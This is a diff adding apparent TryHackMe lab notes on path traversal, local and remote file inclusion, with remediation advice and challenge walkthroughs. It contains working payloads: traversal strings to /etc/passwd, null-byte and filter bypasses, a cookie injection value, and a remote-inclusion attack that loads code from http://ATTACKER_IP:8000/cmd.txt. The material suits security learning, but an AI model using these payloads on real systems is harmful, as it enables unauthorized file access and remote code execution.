@@ -1,0 +1,86 @@
+
+File inclusion
+ = web app exposes or allows execution of sensitive files
+
+ - Path traversal (OWASP A01)
+    - allowing access to files outside the intended directory
+
+ - File inclusion (OWASP A03)
+    - allowing execution of files on the server (local or remote)
+    - eg. through unsanitized input (injection)
+
+ - Security misconfiguration (OWASP A05)
+    - eg. allowing directory listing, exposing sensitive files
+
+What is the risk?
+ - exposing company secrets (eg. source code)
+ - exposing sensitive user data (legal risk)
+ - malicious file inclusion (eg. webshell) can lead to full server compromise
+ - remote file inclusion (RFI) - eg. server executes a file from an attacker-controlled server (very bad)
+
+Path traversal (directory traversal)
+ - read files outside the web application's root directory
+ - malicious user input gets passed into a file-handling function
+   eg. http://webapp.thm/get.php?file=../../../../etc/passwd
+ - on windows we try to access boot.ini or win.ini
+
+
+Local File Inclusion (LFI)
+ - file is passed through a language function (eg. include() in PHP)
+ - the server executes code inside the file before returning the output
+ - eg. reading /etc/passwd
+ - if an app is apending .php or whatever to the filename
+   we can try a null byte (%00) - eg. /etc/passwd%00 to tell the underlying C functions to stop reading the string.
+
+ - you can combine null bytes with '.' (eg. ../../../../etc/passwd%00 .)
+   to bypass filters that block /etc/passwd or other common files
+
+ - app is stripping ../ from input ? don't worry bout it
+   just double it up
+   ....//....//....//....//....//etc/passwd
+
+ - forced directory prefix? don't worry bout it
+   just include it at the start and then ../ out
+   dumb_folder/../../../../../etc/os-release
+
+Remote File Inclusion (RFI)
+ - include()-ing a file hosted on the attacker's server
+ - very very dangerous
+ - allows arbitrary code execution on the server
+ - relies on server allowing URLs to be included() (eg. allow_url_fopen, allow_url_include)
+ - these settings are default in some installations, making include() and require() vulnerable to RFI
+ - eg. we made a malicious cmd.txt file
+ - we hosted an http server on attacker (python3 -m http.server)
+ - we included it by inputting http://10.113.112.167:8000/cmd.txt on the vulnerable webapp
+ - it executed the php command that was in cmd.txt
+
+
+Remediation
+ - Input validation with an allowlist
+ - disable allow_url_fopen and allow_url_include in php.ini (prevents include() form fetching remote URLs)
+ - disable detailed error messages (prevents information disclosure)
+ - update your software
+ - web application firewall (additional layer of security, good against common attacks)
+
+Challenge1
+ - we had to change method to POST and find out the path
+ - I also tried to upload a php revshell, but the connection didn't work
+ - we used burp to capture and modify the request
+ - we found the path through error messages
+
+Challenge2
+ - "only admins can access this page"
+ - we captured the request in burp
+ - there we saw a cookie with value Guest
+ - changed it to Admin in Proxy and forwarded the request (to see it in browser)
+ - there was no form on the page, just a message
+ - "file: Admin.php not found" and the include path (through errors)
+ - so we had to change the cookie and grab flag2
+ - Cookie: THM=Admin/../../../../../../etc/flag2%00
+
+
+Playground RCE
+ - hosted an http server on attacker machine (python3 -m http.server)
+ - crafted a txt file with php code to execute hostname
+ - inputed in app: http://ATTACKER_IP:8000/cmd.txt
+ - the server displayed the executed command
